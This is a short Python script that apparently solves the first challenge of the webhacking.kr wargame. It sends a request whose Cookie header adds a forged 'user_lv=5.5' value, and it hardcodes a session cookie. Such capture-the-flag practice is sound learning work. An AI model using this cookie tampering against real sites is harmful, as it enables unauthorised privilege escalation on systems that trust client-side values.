from urllib import request
from Problem import Problem


class Problem01(Problem):
	def __init__(self, cookie=""):
		super(Problem01, self).__init__(1, False, cookie)

	def solve(self):
		url = "http://webhacking.kr/challenge/web/web-01/"
		header = {"Cookie": self.cookie + "user_lv=5.5"}
		request.urlopen(request.Request(url, headers=header), timeout=5)
		super(Problem01, self).solve()

if __name__ == "__main__":
	p = Problem01("70hlpb982h8gp46vm9t6kot6s2")
	p.solve()
